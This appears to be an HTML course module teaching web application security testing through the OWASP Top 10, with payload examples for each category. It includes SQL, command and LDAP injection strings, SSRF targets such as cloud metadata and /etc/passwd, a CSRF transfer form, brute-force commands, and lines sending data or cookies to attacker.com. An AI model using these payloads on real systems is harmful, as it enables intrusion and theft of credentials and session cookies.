
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Application Security Testing</title>
    <style>
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            line-height: 1.6;
            color: #e2e8f0;
            background: #0f172a;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 2rem;
        }
        h1, h2, h3 {
            color: #00ff88;
        }
        h1 {
            border-bottom: 2px solid #00ff88;
            padding-bottom: 0.5rem;
        }
        .highlight {
            background: #1e293b;
            padding: 1rem;
            border-left: 4px solid #00ff88;
            margin: 1rem 0;
        }
        .code {
            background: #334155;
            padding: 1rem;
            border-radius: 4px;
            font-family: 'Fira Code', monospace;
            overflow-x: auto;
            white-space: pre;
        }
        .vulnerability {
            background: #1e293b;
            padding: 1.5rem;
            border-radius: 8px;
            margin: 1.5rem 0;
            border: 1px solid #334155;
        }
        .vulnerability h4 {
            margin-top: 0;
            color: #00ff88;
        }
        ul, ol {
            padding-left: 2rem;
        }
        li {
            margin: 0.5rem 0;
        }
        .warning {
            background: #451a03;
            border: 1px solid #ea580c;
            padding: 1rem;
            border-radius: 6px;
            margin: 1rem 0;
        }
        .info {
            background: #0c4a6e;
            border: 1px solid #0284c7;
            padding: 1rem;
            border-radius: 6px;
            margin: 1rem 0;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 1rem 0;
        }
        th, td {
            border: 1px solid #475569;
            padding: 0.75rem;
            text-align: left;
        }
        th {
            background: #1e293b;
            color: #00ff88;
        }
        .risk-critical { color: #dc2626; }
        .risk-high { color: #ea580c; }
        .risk-medium { color: #d97706; }
        .risk-low { color: #65a30d; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Module 8: Web Application Security Testing</h1>

        <h2>Learning Objectives</h2>
        <ul>
            <li>Master the OWASP Top 10 vulnerabilities and testing methods</li>
            <li>Learn comprehensive web application testing methodologies</li>
            <li>Understand client-side and server-side security issues</li>
            <li>Explore automated and manual testing techniques</li>
            <li>Learn to use industry-standard web application testing tools</li>
        </ul>

        <h2>Introduction to Web Application Security</h2>
        <p>
            Web application security testing involves systematically evaluating web applications 
            for security vulnerabilities. Modern web applications present complex attack surfaces 
            with multiple components, technologies, and potential entry points.
        </p>

        <div class="highlight">
            <strong>Web App Security Importance:</strong>
            <ul style="margin: 0.5rem 0;">
                <li>90% of applications have security vulnerabilities</li>
                <li>Web apps are primary targets for cybercriminals</li>
                <li>Data breaches often start with web application exploits</li>
                <li>Business logic flaws are unique to each application</li>
            </ul>
        </div>

        <h2>OWASP Top 10 (2021) Vulnerabilities</h2>

        <div class="vulnerability">
            <h3>A01:2021 - Broken Access Control <span class="risk-critical">[CRITICAL]</span></h3>
            <h4>Description:</h4>
            <p>Failures in access control enforcement allow users to access unauthorized functionality or data.</p>
            
            <h4>Common Examples:</h4>
            <ul>
                <li>Bypassing access control by modifying URLs, parameters, or API calls</li>
                <li>Privilege escalation (acting as admin without being logged in as admin)</li>
                <li>Accessing other users' accounts by changing account identifiers</li>
                <li>Insecure direct object references (IDOR)</li>
            </ul>

            <h4>Testing Techniques:</h4>
            <div class="code">
# Parameter manipulation
Original: /user/profile?id=123
Test: /user/profile?id=124

# Path traversal
/admin/dashboard
/admin/../user/profile

# HTTP method bypass
GET /admin/delete-user?id=123
POST /admin/delete-user (if GET is blocked)

# JWT manipulation
# Decode JWT token and modify claims
# Try using "none" algorithm
# Modify user role or permissions
            </div>

            <h4>Prevention:</h4>
            <ul>
                <li>Implement proper access control mechanisms</li>
                <li>Deny by default principle</li>
                <li>Server-side access control validation</li>
                <li>Regular access control testing</li>
            </ul>
        </div>

        <div class="vulnerability">
            <h3>A02:2021 - Cryptographic Failures <span class="risk-high">[HIGH]</span></h3>
            <h4>Description:</h4>
            <p>Failures related to cryptography that lead to sensitive data exposure.</p>
            
            <h4>Common Examples:</h4>
            <ul>
                <li>Transmitting sensitive data in clear text</li>
                <li>Using old or weak cryptographic algorithms</li>
                <li>Improper certificate validation</li>
                <li>Weak password hashing</li>
            </ul>

            <h4>Testing Techniques:</h4>
            <div class="code">
# SSL/TLS testing
sslscan target.com
sslyze target.com
testssl.sh target.com

# Check for weak ciphers
nmap --script ssl-enum-ciphers -p 443 target.com

# Password hash analysis
hashcat -m 0 hashes.txt wordlist.txt  # MD5
john --format=sha256 hashes.txt

# Certificate validation
openssl s_client -connect target.com:443
openssl x509 -in cert.pem -text -noout
            </div>
        </div>

        <div class="vulnerability">
            <h3>A03:2021 - Injection <span class="risk-critical">[CRITICAL]</span></h3>
            <h4>Description:</h4>
            <p>Application accepts untrusted data and sends it to an interpreter without proper validation.</p>
            
            <h4>SQL Injection Testing:</h4>
            <div class="code">
# Basic SQL injection tests
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin'--
admin'/*

# Union-based SQL injection
' UNION SELECT 1,2,3--
' UNION SELECT user(),database(),version()--

# Boolean-based blind SQL injection
' AND (SELECT SUBSTRING(user(),1,1))='a'--
' AND (SELECT COUNT(*) FROM users)>0--

# Time-based blind SQL injection
'; WAITFOR DELAY '00:00:05'--
' AND (SELECT SLEEP(5))--

# SQLmap automated testing
sqlmap -u "http://target.com/page?id=1"
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database --tables
            </div>

            <h4>NoSQL Injection Testing:</h4>
            <div class="code">
# MongoDB injection
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

# JavaScript injection in NoSQL
{"username": "admin", "password": {"$where": "return true"}}
            </div>

            <h4>Command Injection Testing:</h4>
            <div class="code">
# Basic command injection
; ls
| ls
& ls
&& ls
` ls `
$(ls)

# Time-based detection
; sleep 10
| ping -c 10 127.0.0.1

# Data exfiltration
; cat /etc/passwd
; curl http://attacker.com/$(whoami)
            </div>

            <h4>LDAP Injection Testing:</h4>
            <div class="code">
# LDAP injection payloads
*)(uid=*))(|(uid=*
*)(|(password=*))
*))%00
)(cn=*))(|(cn=*
            </div>
        </div>

        <div class="vulnerability">
            <h3>A04:2021 - Insecure Design <span class="risk-high">[HIGH]</span></h3>
            <h4>Description:</h4>
            <p>Security flaws in the application's design and architecture.</p>
            
            <h4>Testing Areas:</h4>
            <ul>
                <li>Business logic flaws</li>
                <li>Workflow bypass</li>
                <li>Race conditions</li>
                <li>Trust boundary violations</li>
            </ul>

            <h4>Business Logic Testing:</h4>
            <div class="code">
# Price manipulation
Original: price=100&quantity=1
Test: price=-100&quantity=1
Test: price=0.01&quantity=1

# Workflow bypass
Step 1: Add items to cart
Step 3: Complete purchase (skip payment step)

# Race condition testing
# Multiple simultaneous requests
# Concurrent transactions
# Resource exhaustion
            </div>
        </div>

        <div class="vulnerability">
            <h3>A05:2021 - Security Misconfiguration <span class="risk-medium">[MEDIUM]</span></h3>
            <h4>Description:</h4>
            <p>Inadequate security hardening across the application stack.</p>
            
            <h4>Common Issues:</h4>
            <ul>
                <li>Default credentials</li>
                <li>Unnecessary features enabled</li>
                <li>Detailed error messages</li>
                <li>Outdated software components</li>
            </ul>

            <h4>Testing Techniques:</h4>
            <div class="code">
# Default credentials testing
admin:admin
admin:password
root:root
guest:guest

# Directory listing
http://target.com/uploads/
http://target.com/admin/
http://target.com/backup/

# Information disclosure
# Check HTTP headers
# Error message analysis
# Configuration file exposure
/.env
/config.php
/wp-config.php
            </div>
        </div>

        <div class="vulnerability">
            <h3>A06:2021 - Vulnerable and Outdated Components <span class="risk-high">[HIGH]</span></h3>
            <h4>Description:</h4>
            <p>Using components with known vulnerabilities.</p>
            
            <h4>Detection Methods:</h4>
            <div class="code">
# Component identification
whatweb target.com
wappalyzer target.com

# Version detection
nmap --script http-enum target.com
nikto -h target.com

# Vulnerability databases
# CVE (Common Vulnerabilities and Exposures)
# NVD (National Vulnerability Database)
# OWASP Dependency Check

# Automated scanning
retire.js  # JavaScript libraries
bundler-audit  # Ruby gems
npm audit  # Node.js packages
            </div>
        </div>

        <div class="vulnerability">
            <h3>A07:2021 - Identification and Authentication Failures <span class="risk-high">[HIGH]</span></h3>
            <h4>Description:</h4>
            <p>Weaknesses in user identity confirmation and authentication.</p>
            
            <h4>Testing Areas:</h4>
            <ul>
                <li>Weak password policies</li>
                <li>Brute force attacks</li>
                <li>Session management flaws</li>
                <li>Credential stuffing</li>
            </ul>

            <h4>Authentication Testing:</h4>
            <div class="code">
# Brute force testing
hydra -l admin -P passwords.txt target.com http-post-form
burp intruder for web forms
medusa -h target.com -u admin -P passwords.txt -M http

# Session testing
# Check session token randomness
# Test session fixation
# Session timeout testing
# Concurrent sessions

# Password policy testing
# Minimum length requirements
# Character complexity
# Password history
# Account lockout policies
            </div>
        </div>

        <div class="vulnerability">
            <h3>A08:2021 - Software and Data Integrity Failures <span class="risk-high">[HIGH]</span></h3>
            <h4>Description:</h4>
            <p>Failures in software updates, critical data, and CI/CD pipelines without integrity verification.</p>
            
            <h4>Testing Techniques:</h4>
            <div class="code">
# Insecure deserialization
# Java serialization testing
# Python pickle testing
# PHP object injection

# CI/CD pipeline testing
# Source code integrity
# Build artifact verification
# Supply chain attacks

# Auto-update mechanisms
# Man-in-the-middle attacks
# Signature verification
# Update channel security
            </div>
        </div>

        <div class="vulnerability">
            <h3>A09:2021 - Security Logging and Monitoring Failures <span class="risk-medium">[MEDIUM]</span></h3>
            <h4>Description:</h4>
            <p>Insufficient logging and monitoring allowing attacks to go undetected.</p>
            
            <h4>Testing Areas:</h4>
            <ul>
                <li>Event logging completeness</li>
                <li>Log integrity protection</li>
                <li>Monitoring and alerting</li>
                <li>Incident response capabilities</li>
            </ul>
        </div>

        <div class="vulnerability">
            <h3>A10:2021 - Server-Side Request Forgery (SSRF) <span class="risk-high">[HIGH]</span></h3>
            <h4>Description:</h4>
            <p>Web application fetches remote resources without validating user-supplied URLs.</p>
            
            <h4>SSRF Testing:</h4>
            <div class="code">
# Basic SSRF testing
http://localhost
http://127.0.0.1
http://0.0.0.0
http://internal-server

# Cloud metadata endpoints
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/

# Protocol bypass
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:11211/stats

# Bypass techniques
http://localhost.localdomain
http://127.0.0.1.xip.io
http://[::1]
            </div>
        </div>

        <h2>Web Application Testing Tools</h2>

        <h3>Burp Suite</h3>
        <p>Comprehensive web application security testing platform:</p>
        <div class="code">
# Burp Suite workflow
1. Configure browser proxy (127.0.0.1:8080)
2. Browse target application
3. Analyze request/response in Proxy
4. Send interesting requests to Repeater
5. Use Scanner for automated testing
6. Use Intruder for fuzzing and brute force

# Burp Suite extensions
- SQLiPy (SQL injection)
- XSS Validator
- ActiveScan++
- Param Miner
- Collaborator Everywhere
        </div>

        <h3>OWASP ZAP</h3>
        <p>Free web application security scanner:</p>
        <div class="code">
# ZAP automation
zap-cli quick-scan http://target.com
zap-cli spider http://target.com
zap-cli active-scan http://target.com

# ZAP baseline scan
docker run -t owasp/zap2docker-stable zap-baseline.py -t http://target.com

# ZAP API usage
zap.spider.scan(url)
zap.ascan.scan(url)
zap.core.alerts()
        </div>

        <h3>Manual Testing Tools</h3>
        <div class="code">
# cURL for manual testing
curl -X POST -d "user=admin&pass=test" http://target.com/login
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin
curl -b "session=abc123" http://target.com/profile

# Browser developer tools
# Network tab for request analysis
# Console for JavaScript testing
# Security tab for certificate analysis

# Postman for API testing
# Collection organization
# Environment variables
# Automated testing scripts
        </div>

        <h2>Client-Side Security Testing</h2>

        <h3>Cross-Site Scripting (XSS)</h3>
        <div class="code">
# Reflected XSS
&lt;script&gt;alert('XSS')&lt;/script&gt;
&lt;img src=x onerror=alert('XSS')&gt;
&lt;svg onload=alert('XSS')&gt;

# Stored XSS
&lt;script&gt;document.location='http://attacker.com/steal.php?c='+document.cookie&lt;/script&gt;

# DOM-based XSS
# Check for client-side DOM manipulation
# JavaScript debugging
# Source and sink analysis

# XSS filter bypass
&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;
&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))&lt;/script&gt;
&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;
        </div>

        <h3>Cross-Site Request Forgery (CSRF)</h3>
        <div class="code">
# CSRF testing
&lt;form action="http://target.com/transfer" method="POST"&gt;
  &lt;input type="hidden" name="amount" value="1000" /&gt;
  &lt;input type="hidden" name="account" value="attacker" /&gt;
  &lt;input type="submit" value="Click me!" /&gt;
&lt;/form&gt;

# CSRF token analysis
# Check if token is present
# Test token randomness
# Test token validation
# Cross-domain token usage
        </div>

        <h3>Content Security Policy (CSP) Testing</h3>
        <div class="code">
# CSP header analysis
Content-Security-Policy: default-src 'self'
Content-Security-Policy: script-src 'unsafe-inline'

# CSP bypass techniques
# 'unsafe-inline' exploitation
# JSONP callback abuse
# Base tag injection
# Angular.js sandbox bypass
        </div>

        <h2>API Security Testing</h2>

        <h3>REST API Testing</h3>
        <div class="code">
# HTTP method testing
GET /api/users/123
POST /api/users/123 (should be PUT/PATCH)
DELETE /api/users/123
OPTIONS /api/users/123

# Parameter pollution
/api/users?id=123&id=456
/api/users?user[]=admin&user[]=guest

# Rate limiting testing
# Automated requests
# Concurrent connections
# Resource exhaustion

# Authentication bypass
# Missing authentication
# Weak token validation
# Privilege escalation
        </div>

        <h3>GraphQL Testing</h3>
        <div class="code">
# Introspection queries
{__schema{types{name,fields{name,type{name}}}}}

# Query depth analysis
# Recursive queries
# Resource exhaustion
# Information disclosure

# Mutation testing
# Unauthorized data modification
# Input validation bypass
        </div>

        <h2>Advanced Web Application Testing</h2>

        <h3>WebSocket Security</h3>
        <div class="code">
# WebSocket testing
# Connection hijacking
# Message injection
# Cross-site WebSocket hijacking

# Tools for WebSocket testing
# Burp Suite WebSocket support
# OWASP ZAP WebSocket testing
# wscat command-line tool
        </div>

        <h3>Single Page Application (SPA) Testing</h3>
        <ul>
            <li>Client-side routing security</li>
            <li>API endpoint exposure</li>
            <li>Source code analysis</li>
            <li>State management vulnerabilities</li>
        </ul>

        <h3>Progressive Web App (PWA) Testing</h3>
        <ul>
            <li>Service worker security</li>
            <li>Offline functionality testing</li>
            <li>Push notification security</li>
            <li>Background sync vulnerabilities</li>
        </ul>

        <div class="warning">
            <strong>Testing Scope:</strong> Always ensure web application testing is performed 
            within the authorized scope and with proper written permission. Some tests may 
            cause data loss or system disruption.
        </div>

        <h2>Automated vs Manual Testing</h2>

        <h3>Automated Testing Benefits</h3>
        <ul>
            <li>Comprehensive coverage of common vulnerabilities</li>
            <li>Fast execution and repeatable results</li>
            <li>Good for initial vulnerability discovery</li>
            <li>Continuous integration compatibility</li>
        </ul>

        <h3>Manual Testing Benefits</h3>
        <ul>
            <li>Business logic flaw detection</li>
            <li>Complex attack chain development</li>
            <li>Context-aware testing</li>
            <li>Custom vulnerability research</li>
        </ul>

        <h3>Hybrid Approach</h3>
        <ol>
            <li><strong>Start with automated scanning:</strong> Identify low-hanging fruit</li>
            <li><strong>Manual verification:</strong> Confirm and validate findings</li>
            <li><strong>Explore business logic:</strong> Test application-specific workflows</li>
            <li><strong>Custom exploit development:</strong> Demonstrate real-world impact</li>
        </ol>

        <div class="info">
            <strong>Best Practice:</strong> Combine automated tools with manual testing techniques 
            for comprehensive web application security assessment. Neither approach alone is sufficient.
        </div>

        <h2>Reporting Web Application Vulnerabilities</h2>

        <h3>Vulnerability Documentation</h3>
        <ul>
            <li><strong>Clear description:</strong> What is the vulnerability?</li>
            <li><strong>Location:</strong> Where was it found?</li>
            <li><strong>Impact:</strong> What can an attacker do?</li>
            <li><strong>Proof of concept:</strong> Steps to reproduce</li>
            <li><strong>Remediation:</strong> How to fix the issue</li>
        </ul>

        <h3>Risk Assessment Factors</h3>
        <table>
            <tr>
                <th>Factor</th>
                <th>High Risk</th>
                <th>Medium Risk</th>
                <th>Low Risk</th>
            </tr>
            <tr>
                <td>Data Access</td>
                <td>Sensitive data exposure</td>
                <td>Limited data access</td>
                <td>Public data only</td>
            </tr>
            <tr>
                <td>User Impact</td>
                <td>All users affected</td>
                <td>Some users affected</td>
                <td>Individual users</td>
            </tr>
            <tr>
                <td>Exploitability</td>
                <td>Easy to exploit</td>
                <td>Moderate difficulty</td>
                <td>Difficult to exploit</td>
            </tr>
            <tr>
                <td>Authentication</td>
                <td>No authentication needed</td>
                <td>Low privilege required</td>
                <td>High privilege required</td>
            </tr>
        </table>

        <h2>Conclusion</h2>
        <p>
            Web application security testing requires a systematic approach combining automated 
            tools with manual testing techniques. Understanding the OWASP Top 10 provides a 
            foundation, but comprehensive testing must also include business logic and 
            application-specific vulnerabilities.
        </p>

        <div class="highlight">
            <strong>Remember:</strong> Web applications are complex systems with many potential 
            security weaknesses. Thorough testing requires patience, creativity, and deep 
            understanding of web technologies.
        </div>

        <h2>Next Steps</h2>
        <p>In the next module, we'll explore wireless network security testing, including Wi-Fi protocols, attack methods, and security assessment techniques.</p>
    </div>
</body>
</html>
